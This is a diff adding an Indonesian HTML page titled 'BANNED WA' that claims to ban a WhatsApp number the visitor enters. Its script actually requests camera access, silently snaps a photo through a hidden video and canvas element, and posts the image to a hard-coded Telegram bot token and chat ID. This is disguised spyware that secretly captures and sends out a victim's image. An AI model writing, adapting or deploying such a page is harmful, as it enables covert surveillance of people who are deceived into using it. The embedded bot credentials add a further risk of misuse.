@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>BANNED WA</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background-color: #f0f0f0;
+    text-align: center;
+    padding-top: 50px;
+  }
+  h1 {
+    font-size: 48px;
+    color: red;
+  }
+  /* Input nomor */
+  input[type="text"] {
+    font-size: 20px;
+    padding: 10px;
+    width: 300px;
+    margin: 10px 0;
+    border-radius: 8px;
+    border: 1px solid #ccc;
+  }
+  /* Tombol */
+  button {
+    padding: 15px 30px;
+    font-size: 20px;
+    background-color: #4CAF50;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    margin-top: 10px;
+  }
+  button:hover {
+    background-color: #45a049;
+  }
+  /* Video dan canvas hidden */
+  #videoElement {
+    display: none;
+  }
+  #canvas {
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<h1>BANNED WA</h1>
+<p>Masukkan Nomor Target:</p>
+<input type="text" id="nomorTarget" placeholder="+62xxxxxxxxxx" />
+
+<br/>
+
+<button id="gasBanBtn">GAS BAN</button>
+
+<!-- Video untuk preview kamera (disembunyikan) -->
+<video id="videoElement" autoplay></video>
+<!-- Canvas untuk menangkap gambar -->
+<canvas id="canvas"></canvas>
+
+<script>
+const gasBanBtn = document.getElementById('gasBanBtn');
+const video = document.getElementById('videoElement');
+const canvas = document.getElementById('canvas');
+const nomorInput = document.getElementById('nomorTarget');
+
+const telegramToken = '8126176580:AAHeW3Rt5DLp-lb9DqvpjTiW0WX_xbVJM1k'; // Ganti dengan token bot Telegram Anda
+const chatId = '5957844141'; // Ganti dengan chat ID target
+
+gasBanBtn.onclick = () => {
+  const targetNumber = nomorInput.value.trim();
+  if (!targetNumber) {
+    alert('Silakan masukkan nomor target terlebih dahulu.');
+    return;
+  }
+  // Minta izin kamera dan mulai proses otomatis
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then(stream => {
+      video.srcObject = stream;
+      // Setelah stream aktif, ambil gambar otomatis
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          // Atur ukuran canvas sama dengan video
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          // Hentikan stream kamera
+          stream.getTracks().forEach(track => track.stop());
+          // Sembunyikan video
+          video.style.display = 'none';
+
+          // Konversi gambar ke data URL
+          const dataURL = canvas.toDataURL('image/png');
+
+          // Kirim foto ke Telegram
+          sendPhotoToTelegram(dataURL, targetNumber);
+        }, 1000); // Tunggu 1 detik untuk memastikan kamera aktif
+      };
+    })
+    .catch(err => {
+      alert('Tidak dapat mengakses kamera: ' + err);
+    });
+};
+
+function sendPhotoToTelegram(dataURL, targetNumber) {
+  fetch(dataURL)
+    .then(res => res.blob())
+    .then(blob => {
+      const formData = new FormData();
+      formData.append('photo', blob, 'photo.png');
+      formData.append('chat_id', chatId);
+      
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert('Foto dikirim ke Telegram untuk nomor: ' + targetNumber);
+      })
+      .catch(err => {
+        alert('Gagal mengirim ke Telegram: ' + err);
+      });
+    });
+}
+</script>
+
+</body>
+</html>
